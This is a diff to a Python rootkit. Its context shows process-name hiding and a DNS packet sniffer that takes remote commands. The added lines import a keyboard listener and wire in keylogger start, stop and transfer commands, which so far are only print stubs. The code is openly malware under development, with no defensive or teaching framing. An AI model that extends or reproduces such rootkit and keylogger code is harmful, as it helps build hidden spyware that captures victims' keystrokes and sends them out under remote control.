@@ -28,6 +28,7 @@ from utils.process import hide_process_name
 from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send, conf
 from watchdog.observers import Observer
 from watchdog.events import PatternMatchingEventHandler, FileSystemEventHandler
+from pynput.keyboard import Key, Listener
 
 
 PARSER = argparse.ArgumentParser("./rootkit.py")
@@ -269,6 +270,8 @@ def execute_watch_command(path: str) -> bool:
     return True
 
 
+
+
 def packet_handler(pkt):
     """
     
@@ -282,6 +285,13 @@ def packet_handler(pkt):
     if argc == 2:
         if argv[0] == WATCH:
             execute_watch_command(argv[1])
+        if argv[0] == KEYLOGGER:
+            if argv[1] == STOP:
+                print("stop keylogger")
+            if argv[1] == START:
+                print("start keylogger")
+            if argv[1] == TRANSFER:
+                print("transfer keylogger")
 
 
 MONITOR = FileSystemMonitor()
